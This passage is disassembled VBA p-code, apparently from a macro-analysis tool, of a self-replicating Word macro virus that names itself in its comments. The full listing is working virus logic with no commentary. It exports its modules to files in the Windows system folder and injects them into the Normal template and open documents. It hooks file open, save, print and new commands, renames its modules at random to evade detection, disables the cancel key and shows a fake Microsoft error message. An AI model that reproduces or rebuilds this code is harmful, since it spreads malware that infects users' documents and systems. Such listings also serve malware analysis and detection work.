' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #109:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #110:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #111:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #112:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #114:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld x 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID 
' Line #115:
' 	QuoteRem 0x0000 0x001F " RAPE v1.1 Export File ID Morph"
' Line #116:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID 
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #119:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #120:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #121:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #122:
' 	Label rite 
' Line #123:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #126:
' 	Label nex 
' Line #127:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	LitStr 0x001D "C:\windows\system\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St CheckMe 
' Line #129:
' 	Ld CheckMe 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nextt 
' 	EndIf 
' Line #130:
' 	Do 
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #133:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #134:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #135:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #136:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #137:
' 	Label nextt 
' Line #138:
' 	ExitFunc 
' Line #139:
' 	Label Recognize 
' Line #140:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #141:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #143:
' 	LitStr 0x001D "C:\windows\system\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St CheckMe 
' Line #144:
' 	Ld CheckMe 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tryharder 
' 	EndIf 
' Line #145:
' 	Do 
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #148:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #149:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #150:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #151:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #152:
' 	Label tryharder 
' Line #153:
' 	EndFunc 
' Line #154:
' 	FuncDefn (Function Polymorphic_Check())
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #157:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #158:
' 	Dim 
' 	VarDefn FC_Check
' Line #159:
' 	Do 
' Line #160:
' 	LitDI2 0x0001 
' 	Ld FC_Check 
' 	LineInput 
' Line #161:
' 	Ld FC_Check 
' 	LitStr 0x000F "Sub FileClose()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FC_There 
' 	BoS 0x0000 
' 	GoTo FO_Look 
' 	EndIf 
' Line #162:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #163:
' 	Label FO_Look 
' Line #164:
' 	Dim 
' 	VarDefn FO_Check
' Line #165:
' 	Do 
' Line #166:
' 	LitDI2 0x0001 
' 	Ld FO_Check 
' 	LineInput 
' Line #167:
' 	Ld FO_Check 
' 	LitStr 0x000E "Sub FileOpen()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FO_There 
' 	BoS 0x0000 
' 	GoTo FP_Look 
' 	EndIf 
' Line #168:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #169:
' 	Label FP_Look 
' Line #170:
' 	Dim 
' 	VarDefn FP_Check
' Line #171:
' 	Do 
' Line #172:
' 	LitDI2 0x0001 
' 	Ld FP_Check 
' 	LineInput 
' Line #173:
' 	Ld FP_Check 
' 	LitStr 0x000F "Sub FilePrint()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FP_There 
' 	BoS 0x0000 
' 	GoTo FN_Look 
' 	EndIf 
' Line #174:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #175:
' 	Label FN_Look 
' Line #176:
' 	Dim 
' 	VarDefn FN_Check
' Line #177:
' 	Do 
' Line #178:
' 	LitDI2 0x0001 
' 	Ld FN_Check 
' 	LineInput 
' Line #179:
' 	Ld FN_Check 
' 	LitStr 0x000D "Sub FileNew()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FN_There 
' 	BoS 0x0000 
' 	GoTo FS_Look 
' 	EndIf 
' Line #180:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #181:
' 	Label FS_Look 
' Line #182:
' 	Dim 
' 	VarDefn FS_Check
' Line #183:
' 	Do 
' Line #184:
' 	LitDI2 0x0001 
' 	Ld FS_Check 
' 	LineInput 
' Line #185:
' 	Ld FS_Check 
' 	LitStr 0x000E "Sub FileSave()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FS_There 
' 	BoS 0x0000 
' 	GoTo FSA_Look 
' 	EndIf 
' Line #186:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #187:
' 	Label FSA_Look 
' Line #188:
' 	Dim 
' 	VarDefn FSA_Check
' Line #189:
' 	Do 
' Line #190:
' 	LitDI2 0x0001 
' 	Ld FSA_Check 
' 	LineInput 
' Line #191:
' 	Ld FSA_Check 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FSA_There 
' 	BoS 0x0000 
' 	ExitFunc 
' 	EndIf 
' Line #192:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #193:
' 	EndFunc 
' Line #194:
' 	FuncDefn (Function Evolve())
' Line #195:
' 	OnError (Resume Next) 
' Line #196:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #197:
' 	QuoteRem 0x0000 0x0047 "RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)"
' Line #198:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #199:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #201:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0096 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St PM 
' Line #202:
' 	Ld PM 
' 	LitDI2 0x0016 
' 	Eq 
' 	IfBlock 
' Line #203:
' 	Ld FC_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #204:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FileClose()"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On error resume next"
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "Wordbasic.FileSave"
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	Ld PM 
' 	LitDI2 0x0049 
' 	Eq 
' 	IfBlock 
' Line #213:
' 	Ld FO_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #214:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #215:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileOpen()"
' 	PrintItemNL 
' Line #216:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Dialogs(wdDialogFileOpen)"
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	Ld PM 
' 	LitDI2 0x0045 
' 	Eq 
' 	IfBlock 
' Line #223:
' 	Ld FP_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #224:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FilePrint()"
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Dialogs(wdDialogFilePrint)"
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End sub"
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #231:
' 	EndIfBlock 
' Line #232:
' 	Ld PM 
' 	LitDI2 0x007A 
' 	Eq 
' 	IfBlock 
' Line #233:
' 	Ld FN_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #234:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #235:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Sub FileNew()"
' 	PrintItemNL 
' Line #236:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #237:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Dialogs(wdDialogFileNew)"
' 	PrintItemNL 
' Line #238:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #239:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #240:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	Ld PM 
' 	LitDI2 0x005A 
' 	Eq 
' 	IfBlock 
' Line #243:
' 	Ld FS_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #244:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #245:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #246:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #247:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "call Evolution"
' 	PrintItemNL 
' Line #248:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #249:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #250:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #251:
' 	EndIfBlock 
' Line #252:
' 	Ld PM 
' 	LitDI2 0x0008 
' 	Eq 
' 	IfBlock 
' Line #253:
' 	Ld FSA_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #254:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #255:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	PrintItemNL 
' Line #256:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #257:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Dialogs(wdDialogFileSaveAs)"
' 	PrintItemNL 
' Line #258:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #259:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #260:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #261:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #262:
' 	EndIfBlock 
' Line #263:
' 	EndFunc 
' Line #264:
' 	FuncDefn (Function Norminf())
' Line #265:
' 	OnError (Resume Next) 
' Line #266:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #267:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #268:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #269:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #270:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #271:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nexus 
' 	EndIf 
' Line #272:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #273:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #274:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #276:
' 	EndIfBlock 
' Line #277:
' 	Label nexus 
' Line #278:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #279:
' 	StartWithExpr 
' 	Ld FileID2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #280:
' 	EndWith 
' Line #281:
' 	LitStr 0x0092 "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support."
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #282:
' 	EndFunc 
' Line #283:
' 	FuncDefn (Function FileInft())
' Line #284:
' 	OnError (Resume Next) 
' Line #285:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #286:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #287:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #288:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #289:
' 	StartWithExpr 
' 	Ld FileID2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #290:
' 	EndWith 
' Line #291:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #292:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St WD 
' Line #293:
' 	StartForVariable 
' 	Ld evo 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld WD 
' 	For 
' Line #294:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #295:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #296:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #297:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #298:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #299:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #300:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #301:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #302:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #303:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #304:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #305:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #306:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #307:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #308:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #309:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #310:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #311:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #312:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #313:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #314:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #315:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #316:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #317:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #318:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #319:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #320:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #321:
' 	Ld VrusName 
' 	Ld a$ 
' 	Add 
' 	St VrusName 
' Line #322:
' 	StartForVariable 
' 	Ld evo 
' 	EndForVariable 
' 	NextVar 
' Line #323:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #324:
' 	Do 
' Line #325:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #326:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Virname 
' 	ParamNamed New 
' 	Ld VrusName 
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #327:
' 	QuoteRem 0x0000 0x0037 " RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters"
' Line #328:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #329:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #330:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #331:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #332:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #333:
' 	Label rite 
' Line #334:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #335:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #336:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #337:
' 	Label nex 
' Line #338:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #339:
' 	EndFunc 
' Line #340:
' 	FuncDefn (Function Evolution())
' Line #341:
' 	OnError (Resume Next) 
' Line #342:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #343:
' 	ArgsCall (Call) Self_Recognition 0x0000 
' Line #344:
' 	ArgsCall (Call) Armor_Status 0x0000 
' Line #345:
' 	ArgsCall (Call) Export_Code 0x0000 
' Line #346:
' 	ArgsCall (Call) Polymorphic_Check 0x0000 
' Line #347:
' 	ArgsCall (Call) Evolve 0x0000 
' Line #348:
' 	Ld Hostinf 
' 	LitVarSpecial (False)
